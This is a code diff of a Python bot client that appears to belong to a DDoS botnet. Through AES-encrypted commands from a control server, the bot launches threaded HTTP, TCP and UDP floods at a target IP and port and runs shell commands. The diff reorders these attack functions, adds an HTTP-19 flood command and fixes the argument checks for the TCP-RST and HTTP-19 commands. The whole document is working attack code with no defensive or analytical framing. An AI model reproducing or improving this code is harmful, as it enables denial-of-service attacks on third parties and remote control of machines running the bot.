@@ -1,38 +1,8 @@
 import base64,socket,threading
 from Encryptor import AES_Encryption
-import socket,struct,threading,os,random,string
-
-banner = '\x1b[38;5;196mReply \x1b[38;5;197mfrom \x1b[38;5;198mKEY\x1b[38;5;255m=\x1b[38;5;198m%s \x1b[38;5;198mIV\x1b[38;5;255m=\x1b[38;5;198m%s\r\n%s\x1b[0m'
+import socket,threading,os,string,random,struct
 
 stop = 0
-
-def http_flood(ip,method,count):
-    global stop
-    for _ in range(count):
-        try:
-            if stop == 1:break
-            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-            s.connect((ip))
-            s.connect_ex((ip))
-            packet = f'{method} /{"".join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(1))} HTTP/1.1\nHost: {ip}\n\n\r\r'.encode()
-            for _ in range(2500):
-                if stop == 1:break
-                s.send(packet)
-                s.sendall(packet)
-        except:
-            pass
-        
-def code(com,mode=0):
-  global stop
-  ip,port,thread,size = com[1], int(com[2]),int(com[3]),int(com[4])
-  if mode == 0:
-   for _ in range(int(com[3])*5):
-    if stop == 1:break
-    threading.Thread(target=http_flood,args=((com[1],int(com[2])),com[5],int(com[4]))).start()
-  elif mode == 1:
-    [threading.Thread(target=CNC,args=((ip,port),size)).start() for _ in range(thread)]
-  elif mode == 2:
-    [threading.Thread(target=SOC,args=((ip,port),size)).start() for _ in range(thread)]
 
 def TCP_RESET(s,size):
   global stop
@@ -52,6 +22,22 @@ def CNC(addr,size):
       threading.Thread(target=TCP_RESET,args=(s,size)).start()
   except Exception as e:print(e)
 
+def http_flood(ip,method,count):
+    global stop
+    for _ in range(count):
+        try:
+            if stop == 1:break
+            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            s.connect((ip))
+            s.connect_ex((ip))
+            packet = f'{method} /{"".join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(1))} HTTP/1.1\nHost: {ip}\n\n\r\r'.encode()
+            for _ in range(2500):
+                if stop == 1:break
+                s.send(packet)
+                s.sendall(packet)
+        except:
+            pass
+
 def UDP_ATTACK(s,size,addr):
     global stop
     try:
@@ -69,6 +55,20 @@ def SOC(addr,size):
       s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
       threading.Thread(target=UDP_ATTACK,args=(s,size,addr)).start()
   except:pass
+
+banner = '\x1b[38;5;196mReply \x1b[38;5;197mfrom \x1b[38;5;198mKEY\x1b[38;5;255m=\x1b[38;5;198m%s \x1b[38;5;198mIV\x1b[38;5;255m=\x1b[38;5;198m%s\r\n%s\x1b[0m'
+        
+def code(com,mode=0):
+  global stop
+  ip,port,thread,size = com[1], int(com[2]),int(com[3]),int(com[4])
+  if mode == 0:
+   for _ in range(int(com[3])*5):
+    if stop == 1:break
+    threading.Thread(target=http_flood,args=((com[1],int(com[2])),com[5],int(com[4]))).start()
+  elif mode == 1:
+    [threading.Thread(target=CNC,args=((ip,port),size)).start() for _ in range(thread)]
+  elif mode == 2:
+    [threading.Thread(target=SOC,args=((ip,port),size)).start() for _ in range(thread)]
 
 IP = '127.0.0.1'
 PORT = 1
@@ -149,7 +149,7 @@ def process_resp(s,resp,key):
     else:cache_response.append([resp,com[0]])
  s.send(com[0])
 
-help = ['PING','CACHE_NOW','CACHE_CLEAR','SHELL','SHELL2','UDP-STORM','TCP-RST','STOP']
+help = ['PING','CACHE_NOW','CACHE_CLEAR','SHELL','SHELL2','UDP-STORM','TCP-RST','HTTP-19','STOP']
 
 def run(command):
  null_output = '> NUL 2>&1' if os.name == 'nt' else '> /dev/null 2>&1'
@@ -193,11 +193,20 @@ def command(s,command,key):
     threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;76mSHELL \x1b[38;5;77m<command>'),key)).start()
   elif com[0].upper() in ['UDP-STORM','UDPSTORM','UDP_STORM']:
     if len(com) == 5:
-     ip,port,thread,size = com[1], int(com[2]),int(com[3]),int(com[4])
-     threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;76mSending \x1b[38;5;77mcommand \x1b[38;5;78m{com[0]} \x1b[38;5;79m--> \x1b[38;5;80m{ip}\x1b[38;5;255m:\x1b[38;5;81m{port}'),key)).start()
+     threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;76mSending \x1b[38;5;77mcommand \x1b[38;5;78m{com[0]} \x1b[38;5;79m--> \x1b[38;5;80m{com[1]}\x1b[38;5;255m:\x1b[38;5;81m{com[2]}'),key)).start()
      threading.Thread(target=code,args=(com,2)).start()
     else:threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;196m{com[0]} <IP> <PORT> <THREAD> SIZE'),key)).start()
-  elif com[0].upper() in ['?H','?','HELP','H']:
+  elif com[0].upper() in ['TCP-RST','TCP_RESET','TCP_RST','TCP-RESET']:
+    if len(com) == 5:
+     threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;76mSending \x1b[38;5;77mcommand \x1b[38;5;78m{com[0]} \x1b[38;5;79m--> \x1b[38;5;80m{com[1]}\x1b[38;5;255m:\x1b[38;5;81m{com[2]}'),key)).start()
+     threading.Thread(target=code,args=(com,1)).start()
+    else:threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;196m{com[0]} <IP> <PORT> <THREAD> SIZE'),key)).start()
+  elif com[0].upper() in ['HTTP-19','HTTP','H19','HTTP_19']:
+    if len(com) == 6:
+     threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;76mSending \x1b[38;5;77mcommand \x1b[38;5;78m{com[0]} \x1b[38;5;79m--> \x1b[38;5;80m{com[1]}\x1b[38;5;255m:\x1b[38;5;81m{com[0]}'),key)).start()
+     threading.Thread(target=code,args=(com,0)).start()
+    else:threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;196m{com[0]} <IP> <PORT> <THREAD> <TIME> <METHOD>'),key)).start()
+  elif com[0].upper() in ['?H','?','HELP']:
    threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;76m{", ".join(help)}'),key)).start()
   elif com[0].upper() in ['STOP','END-ATTACK','END_ATTACK','END-ATK','CLOSE-ATK','CLOSE-ATTACK']:
    if stop == 1:
@@ -206,15 +215,6 @@ def command(s,command,key):
    else:
     threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;196mCurrent stop . . .'),key)).start()
     stop = 1
-  elif com[0].upper() in ['TCP-RST','TCP_RESET','TCP_RST','TCP-RESET']:
-    if len(com) == 5:
-     ip,port,thread,size = com[1], int(com[2]),int(com[3]),int(com[4])
-     threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;76mSending \x1b[38;5;77mcommand \x1b[38;5;78m{com[0]} \x1b[38;5;79m--> \x1b[38;5;80m{ip}\x1b[38;5;255m:\x1b[38;5;81m{port}'),key)).start()
-     threading.Thread(target=code,args=(com,1)).start()
-    else:threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;196m{com[0]} <IP> <PORT> <THREAD> SIZE'),key)).start()
-  elif com[0].upper() in ['HTTP-19','HTTP','H19','HTTP_19']:
-    threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;76mSending \x1b[38;5;77mcommand \x1b[38;5;78m{com[0]} \x1b[38;5;79m--> \x1b[38;5;80m{ip}\x1b[38;5;255m:\x1b[38;5;81m{port}'),key)).start()
-    threading.Thread(target=code,args=(com,0)).start()
   else:threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;196mNot \x1b[38;5;197mFound \x1b[38;5;76m(\x1b[38;5;75m"\x1b[38;5;78m{com[0]}\x1b[38;5;75m"\x1b[38;5;76m)'),key)).start()
  except Exception as e:print(e)
 
